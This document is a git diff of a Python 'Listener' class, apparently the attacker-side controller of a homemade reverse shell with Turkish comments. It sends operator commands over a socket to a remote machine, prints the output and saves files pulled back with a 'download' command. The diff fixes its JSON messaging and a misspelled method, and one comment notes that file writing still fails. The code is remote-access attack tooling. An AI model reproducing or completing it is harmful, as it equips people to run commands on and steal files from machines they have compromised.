@@ -1,7 +1,9 @@
 import socket
+import json
+
 import subprocess
 import shlex
-import json
+
 
 
 class Listener:
@@ -17,20 +19,22 @@ class Listener:
 
 
     def reliable_send(self, data):
-        if isinstance(data, bytes):
-            data = data.decode("utf-8")
-        json_data = json.dumps(data) if isinstance(data, bytes) else json.dumps(data)
-        self.connection.send(json_data.encode("utf-8"))
+        json_data = json.dumps(data)
+        byte_data = json_data.encode("utf-8")
+        self.connection.send(byte_data)
 
 
-    def reliable_recieve(self):
+    def reliable_receive(self):
         json_data = b""
-
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data.decode("utf-8"))
-            except ValueError: 
+                chunk = self.connection.recv(1024)
+                if not chunk:
+                    break
+                json_data += chunk
+                decoded_data = json_data.decode("utf-8")
+                return json.loads(decoded_data)
+            except ValueError:
                 continue
 
 
@@ -49,7 +53,7 @@ class Listener:
 
             elif self.is_system_command(command):
                 self.reliable_send(command)
-                resultt = self.reliable_recieve()
+                resultt = self.reliable_receive()
                 print(resultt)
             else:
                 print("bu bir sistem komutu değil gönderilemedi")
@@ -71,21 +75,21 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb+") as file:
-            file.write(content)
+            file.write(content) # dosyanın içindeki contenti alamıyor o yüzden yazamıyor 
             return "[+] Dosya İndirildi"
         
 
     def run(self):
         while True:
             command = input("-> ")
-            # command = command.split(" ")
-            # command = command.split(" ") 
             result = self.remote(command)
 
             if command.startswith("download"):
                 command = command.split(" ")
+                print(result)
                 print(command[1])
-                result = self.write_file(command[1], result)            
+                result = self.write_file(command[1], result)    
+    
 
 
 
